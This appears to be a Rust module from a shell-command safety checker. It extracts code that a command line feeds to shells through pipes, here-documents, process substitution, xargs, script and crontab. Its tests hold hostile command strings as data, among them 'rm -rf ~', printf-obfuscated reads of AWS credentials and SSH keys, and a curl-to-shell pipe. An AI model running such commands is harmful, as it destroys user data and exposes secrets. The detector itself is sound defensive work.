/// `stdin_code_eff` and `pipe_code_eff`).
fn reads_stdin_code(
    e: &[String],
    unknown_word: bool,
    folds: FoldRules,
    budget: &mut ComputeBudget,
) -> Result<bool, Exhausted> {
    let Some(first) = e.first() else {
        return Ok(false);
    };
    if unknown_word && has_substitution(first) {
        return Ok(true);
    }
    if maybe_shell(first, folds, budget)? {
        // a variable alone (`$PAGER`) reads stdin as code only with `-s`/`-`
        if first.contains('$') && !has_substitution(first) && !first.contains("${") {
            return Ok(e[1..].iter().any(|a| a == "-s" || a == "-"));
        }
        return Ok(true);
    }
    let f = fold_cmd_cr19(first, folds, budget)?;
    if matches!(f.as_str(), "eval" | "source" | ".") {
        return Ok(true);
    }
    if reads_stdin_as_script_budgeted(&f, &e[1..], budget)? {
        return Ok(true);
    }
    // `env -S 'sh -s'`, `$(which env) -S …`
    if let Some(s) = extract_env_split_string_be(e, folds, budget)? {
        let inner: Vec<String> = s.split_whitespace().map(str::to_owned).collect();
        if let Some(i0) = inner.first() {
            let f0 = fold_cmd_cr19(i0, folds, budget)?;
            if is_shell_folded(&f0, budget)?
                || reads_stdin_as_script_budgeted(&f0, &inner[1..], budget)?
            {
                return Ok(true);
            }
        }
    }
    Ok(false)
}

/// Whether a command (any reading) is a stdin-code sink, and whether it is
/// a same-shell one (`source`/`.`/`eval`).
fn command_sink(
    argv: &[String],
    folds: FoldRules,
    budget: &mut ComputeBudget,
) -> Result<Option<PayloadKind>, Exhausted> {
    let (rs, unknown) = readings(argv, folds, budget)?;
    for r in &rs {
        if reads_stdin_code(r, unknown, folds, budget)? {
            let same = r.first().is_some_and(|f| {
                let b = f.rsplit('/').next().unwrap_or(f);
                matches!(b, "source" | "." | "eval")
            });
            return Ok(Some(if same {
                PayloadKind::SameShell
            } else {
                PayloadKind::Child
            }));
        }
    }
    Ok(None)
}

/// Whether any command of a text (a `>(…)` body, a stage) is a sink.
fn text_sink(
    text: &str,
    folds: FoldRules,
    budget: &mut ComputeBudget,
) -> Result<Option<PayloadKind>, Exhausted> {
    for cmd in stage_commands(text, budget)? {
        let (argv, _, _, _) = command_parts(&cmd, budget)?;
        if let Some(k) = command_sink(&cooked(&argv), folds, budget)? {
            return Ok(Some(k));
        }
    }
    Ok(None)
}

/// What a stage writes on stdout, as far as the engine reads it.
fn stage_outputs(
    stage: &Stage,
    folds: FoldRules,
    budget: &mut ComputeBudget,
) -> Result<Vec<String>, Exhausted> {
    let mut texts = Vec::new();
    for cmd in stage_commands(&stage.text, budget)? {
        let (argv, _, _, here) = command_parts(&cmd, budget)?;
        let argv = cooked(&argv);
        echo_printf_texts(&argv, folds, &mut texts, budget)?;
        if let Some(f) = argv.first() {
            let f = fold_cmd_cr19(f, folds, budget)?;
            if f == "cat" && argv.len() == 1 {
                for h in stage.heredocs.iter().chain(here.iter()) {
                    texts.push(clone_str_budgeted(h, budget)?);
                }
            }
        }
    }
    Ok(texts)
}

fn push_payload(
    out: &mut Vec<Payload>,
    text: String,
    kind: PayloadKind,
    pipe_to_shell: bool,
    budget: &mut ComputeBudget,
) -> Result<(), Exhausted> {
    if out.len() >= MAX_PAYLOADS || text.len() > MAX_PAYLOAD_BYTES {
        return Ok(());
    }
    if out.iter().any(|p| p.text == text && p.kind == kind) {
        return Ok(());
    }
    budget.charge_alloc(text.len() + std::mem::size_of::<Payload>())?;
    out.push(Payload {
        text,
        kind,
        pipe_to_shell,
    });
    Ok(())
}

/// `script`'s command in each option reading (`-t0`, `-t/dev/null`,
/// `-at/dev/null`, `--timing=…`, BSD's `script [opts] [file [command]]`).
fn script_commands(argv: &[Word], budget: &mut ComputeBudget) -> Result<Vec<String>, Exhausted> {
    let mut out = Vec::new();
    let mut j = 1;
    while j < argv.len() {
        let w = argv[j].cooked.as_str();
        budget.charge(w.len().max(1) as u64)?;
        if w == "--" {
            j += 1;
            break;
        }
        if let Some(long) = w.strip_prefix("--") {
            let takes_next = !long.contains('=')
                && [
                    "log-io",
                    "log-in",
                    "log-out",
                    "output-limit",
                    "logging-format",
                    "command",
                    "echo",
                ]
                .iter()
                .any(|n| n.starts_with(long) && long.len() >= 3);
            j += if takes_next { 2 } else { 1 };
            continue;
        }
        if w.starts_with('-') && w.len() > 1 {
            // `-t[file]` (util-linux) and `-t time` (BSD): the attached form
            // takes nothing more; `-F pipe`, `-I/-O/-B file` take the next word
            let body = &w[1..];
            let next = body
                .char_indices()
                .find(|(_, c)| matches!(c, 'F' | 'I' | 'O' | 'B' | 'T' | 'E' | 'm' | 'c'))
                .is_some_and(|(k, c)| k + c.len_utf8() == body.len());
            j += if next { 2 } else { 1 };
            continue;
        }
        break;
    }
    for start in [j, j + 1] {
        if start < argv.len() {
            let t: Vec<&str> = argv[start..].iter().map(|w| w.raw.as_str()).collect();
            let joined = t.join(" ");
            budget.charge_alloc(joined.len())?;
            out.push(joined);
        }
    }
    Ok(out)
}

/// Appends a single-stage top-level `cd`/`pushd`/`popd` pipeline to `ctx`
/// (the directory context a payload later on the line runs in).
fn extend_cd_context(
    pl: &Pipeline,
    ctx: &mut String,
    budget: &mut ComputeBudget,
) -> Result<(), Exhausted> {
    if pl.stages.len() != 1 {
        return Ok(());
    }
    let t = pl.stages[0].text.as_str();
    let first = t.split_whitespace().next().unwrap_or("");
    if matches!(first, "cd" | "pushd" | "popd") && ctx.len() + t.len() <= MAX_PAYLOAD_BYTES {
        budget.charge_alloc(t.len() + 2)?;
        ctx.push_str(t);
        ctx.push_str("; ");
    }
    Ok(())
}

/// Every payload `dev` read in `text` that rev 4's units don't carry.
pub(super) fn dev_payloads(
    text: &str,
    folds: FoldRules,
    budget: &mut ComputeBudget,
) -> Result<Vec<Payload>, Exhausted> {
    let mut out: Vec<Payload> = Vec::new();
    let (pipelines, cmd_text) = split_pipelines(text, budget)?;
    let mut ctx = String::new();
    for pl in &pipelines {
        dev_payloads_of_pipeline(pl, &cmd_text, &ctx, folds, budget, &mut out)?;
        extend_cd_context(pl, &mut ctx, budget)?;
    }
    Ok(out)
}

fn dev_payloads_of_pipeline(
    pl: &Pipeline,
    cmd_text: &str,
    ctx: &str,
    folds: FoldRules,
    budget: &mut ComputeBudget,
    out: &mut Vec<Payload>,
) -> Result<(), Exhausted> {
    {
        let rest = &cmd_text[pl.end.min(cmd_text.len())..];
        let with_ctx =
            |p: &str, kind: PayloadKind, budget: &mut ComputeBudget| -> Result<String, Exhausted> {
                let tail = if kind == PayloadKind::SameShell {
                    rest
                } else {
                    ""
                };
                budget.charge_alloc(ctx.len() + p.len() + tail.len() + 2)?;
                Ok(format!("{ctx}{p}\n{tail}"))
            };
        let mut downloader_before = false;
        for (si, stage) in pl.stages.iter().enumerate() {
            let cmds = stage_commands(&stage.text, budget)?;
            // 1. a pipe sink: what the stage before writes is code
            if si > 0 {
                let mut sink: Option<PayloadKind> = None;
                for cmd in &cmds {
                    let (argv, _, _, _) = command_parts(cmd, budget)?;
                    if let Some(k) = command_sink(&cooked(&argv), folds, budget)? {
                        sink = Some(k);
                        break;
                    }
                }
                if let Some(kind) = sink {
                    if downloader_before {
                        push_payload(out, String::new(), kind, true, budget)?;
                    }
                    for t in stage_outputs(&pl.stages[si - 1], folds, budget)? {
                        let p = with_ctx(&t, kind, budget)?;
                        push_payload(out, p, kind, false, budget)?;
                    }
                }
                // `ls | xargs CMD`: CMD reads the listed names
                let prev = stage_commands(&pl.stages[si - 1].text, budget)?;
                if let (Some(pc), Some(rc)) = (prev.last(), cmds.first()) {
                    let (pa, _, _, _) = command_parts(pc, budget)?;
                    let (ra, _, _, _) = command_parts(rc, budget)?;
                    let pa = cooked(&pa);
                    let ra_c = cooked(&ra);
                    let pf = pa.first().map(String::as_str).unwrap_or("");
                    if ra_c.first().is_some_and(|f| f == "xargs") && matches!(pf, "ls" | "find") {
                        let dir = pa[1..]
                            .iter()
                            .find(|a| !a.starts_with('-'))
                            .cloned()
                            .unwrap_or_else(|| ".".to_owned());
                        let mut k = 1;
                        while k < ra.len() && ra[k].cooked.starts_with('-') {
                            k += 1;
                        }
                        if k < ra.len() {
                            let cmd: Vec<&str> = ra[k..].iter().map(|w| w.raw.as_str()).collect();
                            budget.charge_alloc(dir.len() + 16)?;
                            let p = format!("{} {dir}/*", cmd.join(" "));
                            let p = with_ctx(&p, PayloadKind::Child, budget)?;
                            push_payload(out, p, PayloadKind::Child, false, budget)?;
                        }
                    }
                }
            }
            // 2. per command: here-documents, process substitutions,
            //    substituted words, `script` forms
            let mut stage_sink: Option<PayloadKind> = None;
            for cmd in &cmds {
                let (argv_w, ins, outs, here) = command_parts(cmd, budget)?;
                let argv = cooked(&argv_w);
                let Some(first) = argv.first() else { continue };
                let ff = fold_cmd_cr19(first, folds, budget)?;
                if DOWNLOADERS_DEV.contains(&ff.as_str()) {
                    downloader_before = true;
                }
                let sink = command_sink(&argv, folds, budget)?;
                if stage_sink.is_none() {
                    stage_sink = sink;
                }
                // here-strings into a sink
                if let Some(kind) = sink {
                    for h in &here {
                        let p = with_ctx(h, kind, budget)?;
                        push_payload(out, p, kind, false, budget)?;
                    }
                }
                // `bash <(echo …)`, `source <(…)`, `env -S… bash <(…)`,
                // `find . -exec bash <(…) \;`: a shell word anywhere reads it
                let mut psub_kind = sink;
                if psub_kind.is_none() && !ins.is_empty() {
                    for (k, w) in argv.iter().enumerate().skip(1) {
                        let f = fold_cmd_cr19(w, folds, budget)?;
                        if matches!(f.as_str(), "source" | ".") {
                            psub_kind = Some(PayloadKind::SameShell);
                            break;
                        }
                        if is_shell_folded(&f, budget)? || (k == 1 && has_substitution(w)) {
                            psub_kind = Some(PayloadKind::Child);
                            break;
                        }
                    }
                }
                if let Some(kind) = psub_kind {
                    for body in &ins {
                        for t in substitution_outputs(body, folds, budget)?.unwrap_or_default() {
                            let p = with_ctx(&t, kind, budget)?;
                            push_payload(out, p, kind, false, budget)?;
                        }
                    }
                }
                // `cmd > >(bash)`: what `cmd` writes is code
                for body in &outs {
                    if let Some(kind) = text_sink(body, folds, budget)? {
                        let mut texts = Vec::new();
                        echo_printf_texts(&argv, folds, &mut texts, budget)?;
                        if ff == "cat" {
                            texts.extend(stage.heredocs.iter().cloned());
                            texts.extend(here.iter().cloned());
                        }
                        for t in texts {
                            let p = with_ctx(&t, kind, budget)?;
                            push_payload(out, p, kind, false, budget)?;
                        }
                    }
                }
                // substituted words: the command word, a shell's `-c` code,
                // and `$(which X)` words behind wrappers
                let (rs, unknown) = readings(&argv, folds, budget)?;
                if rs.len() > 1 {
                    for r in &rs[1..] {
                        budget.charge_alloc(r.iter().map(|w| w.len() + 3).sum::<usize>())?;
                        let p = r
                            .iter()
                            .map(|w| shell_quote(w))
                            .collect::<Vec<_>>()
                            .join(" ");
                        let p = with_ctx(&p, PayloadKind::Child, budget)?;
                        push_payload(out, p, PayloadKind::Child, false, budget)?;
                    }
                }
                if argv.iter().any(|w| has_substitution(w)) {
                    let mut resolved = Vec::with_capacity(argv.len());
                    let mut changed = false;
                    for w in &argv {
                        let base_raw = w.rsplit('/').next().unwrap_or(w);
                        if has_substitution(base_raw)
                            && let Some(n) = substituted_program_simple(base_raw, folds, budget)?
                        {
                            resolved.push(n);
                            changed = true;
                        } else {
                            resolved.push(clone_str_budgeted(w, budget)?);
                        }
                    }
                    if changed {
                        let p = resolved
                            .iter()
                            .map(|w| shell_quote(w))
                            .collect::<Vec<_>>()
                            .join(" ");
                        budget.charge_alloc(p.len())?;
                        let p = with_ctx(&p, PayloadKind::Child, budget)?;
                        push_payload(out, p, PayloadKind::Child, false, budget)?;
                        for k in 0..resolved.len() {
                            if let Some(s) =
                                extract_env_split_string_be(&resolved[k..], folds, budget)?
                            {
                                let p = with_ctx(&s, PayloadKind::Child, budget)?;
                                push_payload(out, p, PayloadKind::Child, false, budget)?;
                            }
                        }
                    }
                }
                for r in &rs {
                    let Some(f0) = r.first() else { continue };
                    if maybe_shell(f0, folds, budget)? || (unknown && has_substitution(f0)) {
                        if let Some(code) = extract_shell_c_code(&r[1..], budget)? {
                            let code = clone_str_budgeted(code, budget)?;
                            if has_substitution(&code) {
                                for t in
                                    expand_substitutions(&code, folds, budget)?.unwrap_or_default()
                                {
                                    let p = with_ctx(&t, PayloadKind::Child, budget)?;
                                    push_payload(out, p, PayloadKind::Child, false, budget)?;
                                }
                            }
                            let p = with_ctx(&code, PayloadKind::Child, budget)?;
                            push_payload(out, p, PayloadKind::Child, false, budget)?;
                        }
                    }
                }
                // `find … -exec sh -c "$(…)"`: the `-c` code behind `-exec`
                for (k, w) in argv.iter().enumerate().skip(1) {
                    if (w == "-exec" || w == "-execdir" || w == "-ok" || w == "-okdir")
                        && let Some(sh) = argv.get(k + 1)
                    {
                        let f = fold_cmd_cr19(sh, folds, budget)?;
                        if is_shell_folded(&f, budget)?
                            && let Some(code) = extract_shell_c_code(&argv[k + 2..], budget)?
                            && has_substitution(code)
                        {
                            for t in expand_substitutions(code, folds, budget)?.unwrap_or_default()
                            {
                                let p = with_ctx(&t, PayloadKind::Child, budget)?;
                                push_payload(out, p, PayloadKind::Child, false, budget)?;
                            }
                        }
                    }
                }
                // `script [opts] CMD…`
                for r in &rs {
                    if r.first()
                        .is_some_and(|f| f.rsplit('/').next() == Some("script"))
                    {
                        for c in script_commands(&argv_w, budget)? {
                            let p = with_ctx(&c, PayloadKind::Child, budget)?;
                            push_payload(out, p, PayloadKind::Child, false, budget)?;
                        }
                        break;
                    }
                }
            }
            // 3. here-documents the stage (a command or a compound) reads
            if let Some(kind) = stage_sink {
                for body in &stage.heredocs {
                    let f = cmds
                        .first()
                        .and_then(|c| c.first())
                        .map(|w| w.cooked.as_str())
                        .unwrap_or("");
                    let body = if f.rsplit('/').next() == Some("crontab") {
                        crontab_commands(body, budget)?
                    } else {
                        clone_str_budgeted(body, budget)?
                    };
                    let p = with_ctx(&body, kind, budget)?;
                    push_payload(out, p, kind, false, budget)?;
                }
            }
        }
    }
    Ok(())
}

const DOWNLOADERS_DEV: &[&str] = &["curl", "wget", "fetch"];

/// The commands of a crontab: each line without its five schedule fields
/// (or its `@reboot`-style word); variable lines and comments dropped.
fn crontab_commands(text: &str, budget: &mut ComputeBudget) -> Result<String, Exhausted> {
    charge_str(text, budget)?;
    budget.charge_alloc(text.len())?;
    let mut out = String::new();
    for line in text.lines() {
        let l = line.trim_start();
        if l.is_empty() || l.starts_with('#') {
            continue;
        }
        let skip = if l.starts_with('@') { 1 } else { 5 };
        let mut rest = l;
        for _ in 0..skip {
            rest = rest.trim_start();
            match rest.find(char::is_whitespace) {
                Some(k) => rest = &rest[k..],
                None => rest = "",
            }
        }
        let first = l.split_whitespace().next().unwrap_or("");
        if !l.starts_with('@')
            && first.split_once('=').is_some_and(|(n, _)| {
                !n.is_empty() && n.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
            })
        {
            continue;
        }
        out.push_str(rest.trim_start());
        out.push('\n');
    }
    Ok(out)
}

/// A word quoted so the best-effort lexer reads it back as one word.
fn shell_quote(w: &str) -> String {
    if !w.is_empty()
        && w.chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_./~=:,@%+*?[]".contains(c))
    {
        return w.to_owned();
    }
    format!("'{}'", w.replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn b() -> ComputeBudget {
        ComputeBudget::with_default_limits()
    }

    fn s(v: &[&str]) -> Vec<String> {
        v.iter().map(|x| (*x).to_owned()).collect()
    }

    fn texts(argv: &[&str]) -> Vec<String> {
        let mut t = Vec::new();
        echo_printf_texts(&s(argv), FoldRules::REV4, &mut t, &mut b()).unwrap();
        t
    }

    #[test]
    fn unescape_decodes_like_echo_and_printf() {
        let mut o = String::new();
        assert!(unescape_to("rm -rf \\x7e", true, &mut o, &mut b()).unwrap());
        assert_eq!(o, "rm -rf ~");
        let mut o = String::new();
        unescape_to("rm -rf \\0176", true, &mut o, &mut b()).unwrap();
        assert_eq!(o, "rm -rf ~");
        let mut o = String::new();
        unescape_to("rm -rf \\176", false, &mut o, &mut b()).unwrap();
        assert_eq!(o, "rm -rf ~");
        let mut o = String::new();
        unescape_to("a\\tb\\u007e", true, &mut o, &mut b()).unwrap();
        assert_eq!(o, "a\tb~");
        let mut o = String::new();
        assert!(!unescape_to("ab\\cde", true, &mut o, &mut b()).unwrap());
        assert_eq!(o, "ab");
    }

    #[test]
    fn printf_formats_like_dev() {
        let f = |fmt: &str, args: &[&str]| format_printf(fmt, &s(args), true, &mut b()).unwrap();
        assert_eq!(f("%s ", &["rm", "-rf", "~"]), "rm -rf ~ ");
        assert_eq!(f("%2$s %1$s\\n", &["~", "rm -rf"]), "rm -rf ~\n");
        assert_eq!(
            f("cat .aws/%.4sentials", &["credXXX"]),
            "cat .aws/credentials"
        );
        assert_eq!(
            f("cat .aws/credentials%.0s", &["x"]),
            "cat .aws/credentials"
        );
        assert_eq!(f("cat .aws/credentials%s", &[]), "cat .aws/credentials");
        assert_eq!(
            f("%*s%s", &["0", "cat .aws/cred", "entials"]),
            "cat .aws/credentials"
        );
        assert_eq!(f("%b", &["rm -rf \\0176"]), "rm -rf ~");
        assert_eq!(f("rm -rf \\176", &[]), "rm -rf ~");
        assert_eq!(f("%5s|%-3s|", &["a", "b"]), "    a|b  |");
        // a huge width is not padded
        assert_eq!(f("%999999999s", &["a"]), "a");
    }

    #[test]
    fn echo_printf_and_yes_texts() {
        assert!(texts(&["echo", "-e", "rm -rf\\t~"]).contains(&"rm -rf\t~".to_owned()));
        assert!(texts(&["echo", "rm -rf ~"]).contains(&"rm -rf ~".to_owned()));
        assert!(texts(&["printf", "%s ", "rm", "-rf", "~"]).contains(&"rm -rf ~ ".to_owned()));
        assert_eq!(texts(&["yes", "rm -rf ~"]), vec!["rm -rf ~".to_owned()]);
        assert_eq!(texts(&["yes"]), vec!["y".to_owned()]);
        assert!(texts(&["cat", "x"]).is_empty());
    }

    fn payload_texts(line: &str) -> Vec<String> {
        dev_payloads(line, FoldRules::REV4, &mut b())
            .unwrap()
            .into_iter()
            .map(|p| p.text)
            .collect()
    }

    fn has(line: &str, needle: &str) {
        let p = payload_texts(line);
        assert!(p.iter().any(|t| t.contains(needle)), "{line:?}: {p:?}");
    }

    #[test]
    fn stdin_reader_and_compound_sinks() {
        has("echo 'rm -rf ~' | at now", "rm -rf ~");
        has("echo 'rm -rf ~' | batch", "rm -rf ~");
        has("echo 'rm -rf ~' | make -f -", "rm -rf ~");
        has("echo 'rm -rf ~' | { :; sh; }", "rm -rf ~");
        has("echo 'rm -rf ~' | if true; then sh; fi", "rm -rf ~");
        has("echo 'rm -rf ~' | while read l; do sh; done", "rm -rf ~");
        has("echo 'rm -rf ~' | case x in *) sh;; esac", "rm -rf ~");
        has("printf 'rm -rf ~\\n' | (true; sh)", "rm -rf ~");
        has(
            "echo 'rm -rf ~' | { function f { true; }; sh; }",
            "rm -rf ~",
        );
        has("yes 'rm -rf ~' | sh", "rm -rf ~");
        // a keyword as an argument opens nothing
        has("echo if 'rm -rf ~' | sh", "rm -rf ~");
        has("echo 'rm -rf ~' }| sh", "rm -rf ~");
        assert!(payload_texts("echo 'rm -rf ~' | cat").is_empty());
    }

    #[test]
    fn heredoc_and_process_substitution_sinks() {
        has("at now <<EOF\nrm -rf ~\nEOF", "rm -rf ~");
        has("make -f - <<EOF\nall:\n\trm -rf ~\nEOF", "rm -rf ~");
        has("chroot / <<EOF\nrm -rf ~\nEOF", "rm -rf ~");
        has("{ bash; } <<EOF\nrm -rf ~\nEOF", "rm -rf ~");
        has("cat <<EOF > >(bash)\nrm -rf ~\nEOF", "rm -rf ~");
        has("cat <<EOF > >(cat | bash)\nrm -rf ~\nEOF", "rm -rf ~");
        has("env -ZSfoo bash <(echo 'rm -rf ~')", "rm -rf ~");
        has("find . -exec bash <(echo 'rm -rf ~/') \\;", "rm -rf ~/");
        has("s$(echo h) <<EOF\nrm -rf ~\nEOF", "rm -rf ~");
        assert!(payload_texts("cat <<EOF\nrm -rf ~\nEOF").is_empty());
    }

    #[test]
    fn substituted_words_script_forms_and_xargs() {
        has("$(echo rm -rf ~)", "rm -rf ~");
        has("nohup `echo rm -rf ~`", "rm -rf ~");
        has("s$(echo h) -c 'rm -rf ~'", "rm -rf ~");
        has("s${E}h -c 'rm -rf ~'", "rm -rf ~");
        has("sh -c \"$(echo rm -rf ~)\"", "rm -rf ~");
        has(
            "$(which nice) -n 5 $(which env) -S 'cat ../.ssh/id_rsa'",
            "cat ../.ssh/id_rsa",
        );
        has("script -t0 rm -rf ~/", "rm -rf ~/");
        has("script --timing=/dev/null sudo id", "sudo id");
        has("cd .ssh; ls | xargs cat", "cat ./*");
        let p = dev_payloads(
            "source /dev/stdin <<EOF\ncd .ssh\nEOF\ncat id_rsa",
            FoldRules::REV4,
            &mut b(),
        )
        .unwrap();
        assert!(
            p.iter().any(|p| p.kind == PayloadKind::SameShell
                && p.text.contains("cd .ssh")
                && p.text.contains("cat id_rsa")),
            "{p:?}"
        );
        let p = dev_payloads(
            "curl -s https://example.com/x | $(which env) -S 'sh -s'",
            FoldRules::REV4,
            &mut b(),
        )
        .unwrap();
        assert!(p.iter().any(|p| p.pipe_to_shell), "{p:?}");
    }

    #[test]
    fn payloads_are_charged() {
        let mut tiny = ComputeBudget::new(16, 1 << 20);
        assert!(dev_payloads("echo 'rm -rf ~' | sh", FoldRules::REV4, &mut tiny).is_err());
    }
}
